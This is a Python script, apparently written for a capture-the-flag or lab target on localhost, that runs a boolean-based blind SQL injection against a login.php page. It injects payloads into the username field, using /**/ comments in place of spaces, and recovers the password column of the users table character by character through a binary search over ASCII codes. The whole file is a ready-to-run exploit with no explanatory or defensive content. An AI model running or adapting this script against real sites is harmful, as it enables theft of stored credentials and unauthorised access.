# -*- utf-8 -*-
# @Author : Hn13
# @Blog   : https://www.hn13.top
import time
import requests

def main():
    fuck_database()

def exploit(payload):

    r = requests.post('http://127.0.0.1:9000/login.php', data={'username': 'admin\'/**/and/**/('+payload+');#', 'password': '111'})

    print("SELECT password FROM users WHERE username='admin\'/**/and/**/("+payload+");#")
    print(r.text)
    if 'password' in r.text:
        return True
    else:
        return False

def fuck_database():

    db_payload = "select/**/concat(password)/**/from/**/users"

    db_name = ""
    for i in range(1, 64):
        db_name_payload = "ascii(substr((" + db_payload + "),{},1))".format(i)
        db_name += chr(binary_search(db_name_payload))
        print(db_name)

    print("Bingo!! " + db_name)

def binary_search(payload):
    print(payload+"\n")
    low = 0
    high = 126
    while low <= high:
        mid = (low + high) / 2
        result = "{}/**/>/**/{}".format(payload, mid)
        if exploit(result):
            low = mid + 1
        else:
            high = mid - 1
    key = int((low + high + 1) / 2)
    return key


if __name__ == '__main__':
    main()